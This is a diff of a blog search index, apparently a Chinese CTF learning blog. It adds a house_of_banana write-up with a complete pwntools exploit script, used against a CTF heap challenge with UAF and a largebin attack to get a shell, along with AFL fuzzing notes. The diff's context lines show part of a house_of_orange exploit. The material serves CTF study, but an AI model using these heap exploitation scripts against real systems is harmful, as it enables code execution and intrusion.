@@ -1,16 +1,114 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>house_of_banana</title>
+    <url>/2022/08/25/2022-08-25-house-of-banana/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>借2022长城杯的一道题学习house_of_banana</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>详细原理可以直接查看放在学习链接里的文章，我也是通过这篇文章学习的，内容就不搬过来了。</p>
+<p>house_of_banana 攻击的是 _rtld_global 的 link_map 链表，通过正常 main 函数返回或者调用 exit 退出，触发函数调用链：<code>exit()-&gt;_dl_fini-&gt;(fini_t)array[i]</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_dl_fini (<span class="hljs-keyword">void</span>)<br>&#123;<br>...<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">maps</span>[<span class="hljs-title">nloaded</span>];</span>    <br><br>   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i;<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>   assert (nloaded != <span class="hljs-number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="hljs-literal">NULL</span>);<br>   <span class="hljs-keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="hljs-number">0</span>; l != <span class="hljs-literal">NULL</span>; l = l-&gt;l_next)<br>     <span class="hljs-comment">/* Do not handle ld.so in secondary namespaces.  */</span><br>     <span class="hljs-keyword">if</span> (l == l-&gt;l_real)      <span class="hljs-comment">//检查节点的地址是否跟自己结构体保存的一致</span><br>       &#123;<br>  assert (i &lt; nloaded);<br><br>  maps[i] = l;<br>  l-&gt;l_idx = i;<br>  ++i;<br><br>  <span class="hljs-comment">/* Bump l_direct_opencount of all objects so that they</span><br><span class="hljs-comment">     are not dlclose()ed from underneath us.  */</span><br>  ++l-&gt;l_direct_opencount;<br>       &#125;<br>   assert (ns != LM_ID_BASE || i == nloaded);<br>   assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br>   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nmaps = i;<br><br>   _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-literal">true</span>);<br><br>   __rtld_lock_unlock_recursive (GL(dl_load_lock));<br><br>   <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nmaps; ++i)<br>     &#123;<br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span> =</span> maps[i];   <span class="hljs-comment">//l遍历link_map的链表</span><br><br>       <span class="hljs-keyword">if</span> (l-&gt;l_init_called)     <span class="hljs-comment">//重要的检查点</span><br>  &#123;<br>    l-&gt;l_init_called = <span class="hljs-number">0</span>;      <br><br>    <span class="hljs-comment">/* Is there a destructor function?  */</span><br>    <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span><br>        || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>))<br>      &#123;<br>        <span class="hljs-comment">/* When debugging print a message first.  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)<br>         &amp; DL_DEBUG_IMPCALLS, <span class="hljs-number">0</span>))<br>   _dl_debug_printf (<span class="hljs-string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<br>       DSO_FILENAME (l-&gt;l_name),<br>       ns);<br><br>        <span class="hljs-comment">/* First see whether an array is given.  */</span><br>        <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span>)<br>   &#123;<br>     ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>       (ElfW(Addr) *) (l-&gt;l_addr<br>         + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br>     <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>         / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br>     <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>       ((<span class="hljs-keyword">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();     <span class="hljs-comment">//目标位置</span><br>   &#125;<br><br>....<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>通过 large bin attack 替换 link_map 链表第三节点的 l_next。</p>
+<p>可以利用下面的命令查看需要修改的地址。</p>
+<p><code>distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</code></p>
+<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143354716.png"><span class="image-caption">image-20220825143354716</span></p>
+<p>link_map 布局：</p>
+<ul>
+<li><p>*(fake+0x28) = fake</p>
+</li>
+<li><p>*(fake+0x48) = fake + 0x58, </p>
+</li>
+<li><p>*(fake+0x50) = 0x8</p>
+</li>
+<li><p>*(fake+0x58) = shell</p>
+</li>
+<li><p>*(fake+0x110) = fake + 0x40</p>
+</li>
+<li><p>*(fake+0x120) = fake + 0x48</p>
+</li>
+<li><p>(int)*(fake+0x31c) = 0x9</p>
+</li>
+<li><p>fake 是写入到 link_map 链表第四节点的堆块地址</p>
+</li>
+</ul>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143519008.png"><span class="image-caption">image-20220825143519008</span></p>
+<p>申请函数，只允许申请到0x40f~0x60f的堆块。</p>
+<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143505081.png"><span class="image-caption">image-20220825143505081</span></p>
+<p>释放时存在UAF。</p>
+<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143604709.png"><span class="image-caption">image-20220825143604709</span></p>
+<p>打印函数只允许打印两次，但是能直接打印地址。</p>
+<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143628967.png"><span class="image-caption">image-20220825143628967</span></p>
+<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143758891.png"><span class="image-caption">image-20220825143758891</span></p>
+<p>编辑函数把真正操作堆块内容的部分都隐藏了，无法反汇编，只能查看汇编语言进行分析。嫌麻烦，没去分析，选择直接去调试，发现只要写入的数据长度小于申请的size就是正常的写入，如果等于，输入的内容就会被更改成垃圾数据。</p>
+<p>所以这题不难，利用好 largebin attack 即可。</p>
+<p>要使用 house of banana，是需要有 libc 和 堆地址的，libc比较容易，申请释放一个堆块即可。</p>
+<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825144305886.png"><span class="image-caption">image-20220825144305886</span></p>
+<p>因为打印函数是 puts，存在 ‘\x00’阻断，所以堆地址需要在 fd 上才能被打印出来。大堆块自然能够想到都是 large bin 时，fd是会指向堆块的，也就可以泄露出堆地址。</p>
+<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825144537239.png"><span class="image-caption">image-20220825144537239</span></p>
+<p>接着就是利用 largebin attack 写入堆地址，再将堆块伪造成 link_map 的节点。</p>
+<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825144842830.png"><span class="image-caption">image-20220825144842830</span></p>
+<p>然后成功getshell。</p>
+<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825144055306.png"><span class="image-caption">image-20220825144055306</span></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> errno <span class="hljs-keyword">import</span> EDEADLK<br><span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> S<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./glibc_master&#x27;</span>)<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;123.56.77.227&#x27;</span><br>    port = <span class="hljs-number">42231</span><br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx, size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;input size:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>	<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;input context:\n&quot;</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x428</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x410</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ebbe0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x500</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x500</span>)<br>show(<span class="hljs-number">0</span>)<br>heap = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xae0</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap)<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x418</span>)<br>free(<span class="hljs-number">6</span>)<br>fd = leak + <span class="hljs-number">0x1ebfd0</span><br>target = <span class="hljs-number">0x1f2018</span> + leak<br>edit(<span class="hljs-number">0</span>, p64(fd)*<span class="hljs-number">2</span> + p64(heap+<span class="hljs-number">0x290</span>) + p64(target-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x500</span>)<br>ogg = leak + <span class="hljs-number">0xe6c7e</span><br>fake = heap + <span class="hljs-number">0xae0</span><br>fake_link_map = <span class="hljs-string">b&#x27;&#x27;</span><br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fake)<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fake+<span class="hljs-number">0x58</span>) + p64(<span class="hljs-number">8</span>) + p64(ogg)<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fake+<span class="hljs-number">0x40</span>)<br>fake_link_map += p64(<span class="hljs-number">0</span>) + p64(fake+<span class="hljs-number">0x48</span>)<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x30C</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">2</span>, fake_link_map)<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;input index:\n&quot;</span>)<br><br><span class="hljs-comment">#debug()</span><br>p.sendline(<span class="hljs-string">b&#x27;30&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h2><p><a href="https://zhuanlan.zhihu.com/p/535469996">https://zhuanlan.zhihu.com/p/535469996</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>2022巅峰极客</title>
+    <url>/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>天问之路</title>
     <url>/2022/07/19/2022-07-20-%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94Fuzz/</url>
     <content><![CDATA[<h1 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h1><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">常用参数<br>-i  <span class="hljs-comment">#指定测试样本的路径</span><br><span class="hljs-regexp">/home/</span>shoucheng<span class="hljs-regexp">/AFLcpp/</span>AFLcpp<span class="hljs-regexp">/debug/</span>fuzz_input<br>-o  <span class="hljs-comment">#指定输出结果的路径</span><br><span class="hljs-regexp">/home/</span>shoucheng<span class="hljs-regexp">/AFLcpp/</span>AFLcpp<span class="hljs-regexp">/debug/</span>fuzz_output<br>-m  <span class="hljs-comment">#最大内存，默认单位为 MB</span><br>none  <span class="hljs-comment">#表示无上限</span><br>-t  <span class="hljs-comment">#设置程序运行超时值，单位为 ms</span><br><span class="hljs-number">500</span>+<br>--  <span class="hljs-comment">#无意义分隔符号</span><br><span class="hljs-regexp">/home/</span>shoucheng<span class="hljs-regexp">/xxx/</span>xxx  <span class="hljs-comment">#执行程序的路径</span><br>@@  <span class="hljs-comment">#表示读文件得到的输入，没有@@则表示从标准输入读取输入</span><br><br>其他参数<br>-M  <span class="hljs-comment">#运行主(Master) Fuzzer</span><br>-S  <span class="hljs-comment">#运行从属(Slave) Fuzzer</span><br>-f  <span class="hljs-comment">#fuzz的目标文件</span><br>-x  <span class="hljs-comment">#额外目录（暂时不懂什么意思）</span><br>-b  <span class="hljs-comment">#绑定一个空闲的CPU core</span><br>-d  <span class="hljs-comment">#跳过确定性阶段</span><br>-B  <span class="hljs-comment">#复用之前已生成过的fuzz_bitmap </span><br>-C  <span class="hljs-comment">#crash模式</span><br>-n  <span class="hljs-comment">#dumb mode 无仪器模式</span><br>-T  <span class="hljs-comment">#显示banner(banner指哪个暂时不懂)</span><br>-Q  <span class="hljs-comment">#qume模式</span><br>-V  <span class="hljs-comment">#打印版本号</span><br></code></pre></td></tr></table></figure>
 
 <h2 id="数据类型说明"><a href="#数据类型说明" class="headerlink" title="数据类型说明"></a>数据类型说明</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span>8_t   s8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span>16_t  s16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span>32_t  s32;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span>64_t  s64;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">uint</span>8_t  u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">uint</span>16_t u16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">uint</span>32_t u32;<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">uint</span>64_t u64;<br></code></pre></td></tr></table></figure>
 
-<h2 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h2><h3 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((opt = getopt(argc, argv, <span class="hljs-string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="hljs-number">0</span>)<br>    	...<br></code></pre></td></tr></table></figure>
+<h2 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h2><h3 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h3><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((opt = getopt(argc, argv, <span class="hljs-string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="hljs-number">0</span>)<br>    	...<br></code></pre></td></tr></table></figure>
 
 <p>刚开始使用<code>getopt</code>函数获取输入的选项参数。</p>
-<h3 id="fuzz执行"><a href="#fuzz执行" class="headerlink" title="fuzz执行"></a>fuzz执行</h3><h3 id="变异策略"><a href="#变异策略" class="headerlink" title="变异策略"></a>变异策略</h3><h4 id="memset-sakura-array"><a href="#memset-sakura-array" class="headerlink" title="memset_sakura_array"></a>memset_sakura_array</h4><p>初始化了两个数组：<code>simplify_lookup</code>和<code>count_class_lookup8</code>。</p>
+<h4 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h4><p>先了解一下常见的信号：</p>
+<table>
+<thead>
+<tr>
+<th align="center">信号名称</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">SIGALRM</td>
+<td align="left">由alarm函数设置的定时器产生</td>
+</tr>
+<tr>
+<td align="center">SIGHUP</td>
+<td align="left">由一个处于非连接状态的终端发送给控制进程，或者由控制进程在自身结束时发送给每个前台进程</td>
+</tr>
+<tr>
+<td align="center">SIGINT</td>
+<td align="left">一般由从终端敲入的Crtl+C组合键或预先设置好的中断字符产生</td>
+</tr>
+<tr>
+<td align="center">SIGKILL</td>
+<td align="left">shell中使用其来强制终止异常进程</td>
+</tr>
+<tr>
+<td align="center">SIGPIPE</td>
+<td align="left">如果向管道写数据时没有与之对应的读进程，就会产生这个信号</td>
+</tr>
+<tr>
+<td align="center">SIGTERM</td>
+<td align="left">作为一个请求被发送，要求进程结束运行。UNIX关机时用这个信号要求系统服务停止运行。它是kill命令默认发送的信号</td>
+</tr>
+<tr>
+<td align="center">SIGUSR1，SIGUSR2</td>
+<td align="left">进程之间可以用这个信号进行通信，例如让进程报告状态信息等</td>
+</tr>
+</tbody></table>
+<h4 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h4><h4 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h4><h3 id="fuzz执行"><a href="#fuzz执行" class="headerlink" title="fuzz执行"></a>fuzz执行</h3><h3 id="变异策略"><a href="#变异策略" class="headerlink" title="变异策略"></a>变异策略</h3><h4 id="memset-sakura-array"><a href="#memset-sakura-array" class="headerlink" title="memset_sakura_array"></a>memset_sakura_array</h4><p>初始化了两个数组：<code>simplify_lookup</code>和<code>count_class_lookup8</code>。</p>
 <h2 id="库函数"><a href="#库函数" class="headerlink" title="库函数"></a>库函数</h2><ul>
 <li><p>getenv() </p>
 <ul>
@@ -95,6 +193,30 @@ struct timezone
 <li>O_SYNC 以同步的方式打开文件。</li>
 </ul>
 </li>
+</ul>
+</li>
+<li><p>sigemptyset()</p>
+<ul>
+<li><code>int sigemptyset(sigset_t *set)</code>该函数的作用是将信号集初始化为空。</li>
+</ul>
+</li>
+<li><p>kill()</p>
+<ul>
+<li><code>int kill(pid_t pid, int sig)</code>kill()可以用来送参数 sig 指定的信号给参数 pid 指定的进程。</li>
+<li>成功时返回0，调用失败返回-1。</li>
+<li>pid 说明：<ul>
+<li>pid&gt;0 将信号传给进程识别码为 pid 的进程。</li>
+<li>pid=0 将信号传给和目前进程相同进程组的所有进程。</li>
+<li>pid=-1 将信号广播传送给系统内所有的进程。</li>
+<li>pid&lt;0 将信号传给进程组识别码为 pid 绝对值的所有进程参数 sig 代表的信号编号。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>alarm()</p>
+<ul>
+<li><code>unsigned int alarm(unsigned int seconds)</code>alarm()函数用来在seconds秒之后安排发送一个SIGALRM信号，如果seconds为0，将取消所有已设置的闹钟请求。</li>
+<li>alarm()函数的返回值是以前设置的闹钟时间的余留秒数，如果失败返回-1。</li>
 </ul>
 </li>
 </ul>
@@ -429,7 +551,7 @@ struct timezone
 <li>对释放的堆块的size进行基本的检查。</li>
 <li>对释放堆块的下一个堆块的size进行基本的检查。</li>
 <li>获取释放堆块所对应的fastbin链表对应的索引。</li>
-<li>检查是否是double free。`</li>
+<li>检查是否是double free。</li>
 <li>释放进单链表。</li>
 </ol>
 <p>fastbin的单链表管理是比较简单的，与<code>global_max_fast</code>相关且需要注意的代码则是fastbin 所对应的index获取以及index所对应的指针获取的代码，即<code>fastbin_index</code>宏以及<code>fastbin</code>宏，对应代码如下：</p>
@@ -877,7 +999,7 @@ struct timezone
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0xfbad3887</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span><br>libc_base = libc - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdin_&quot;</span>]<br></code></pre></td></tr></table></figure>
 
 <p>这样泄露出来的第一个地址将会是<code>_IO_2_1_stdin_</code></p>
-<h3 id="四、任意读写"><a href="#四、任意读写" class="headerlink" title="四、任意读写"></a>四、任意读写</h3><p>伪造缓冲区指针，在一定的条件下应该可以完成任意地址的读写</p>
+<h3 id="四、任意读写"><a href="#四、任意读写" class="headerlink" title="四、任意读写"></a>四、任意读写</h3><p>伪造缓冲区指针，在一定的条件下可以完成任意地址的读写</p>
 <ul>
 <li><code>stdin</code>标准输入缓冲区进行任意地址写。</li>
 <li><code>stdout</code>标准输出缓冲区进行任意地址读写.</li>
@@ -995,9 +1117,7 @@ struct timezone
 <p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313173230192.png"><span class="image-caption">image-20220313173230192</span></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./house_of_orange&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26547</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Name :&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">520</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">&quot;Name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">520</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    <br>add(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xf81</span>)<br>edit(payload)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;aaaaaaaa&quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5188</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>_IO_list_all = libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] + libc_base<br>sys = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span 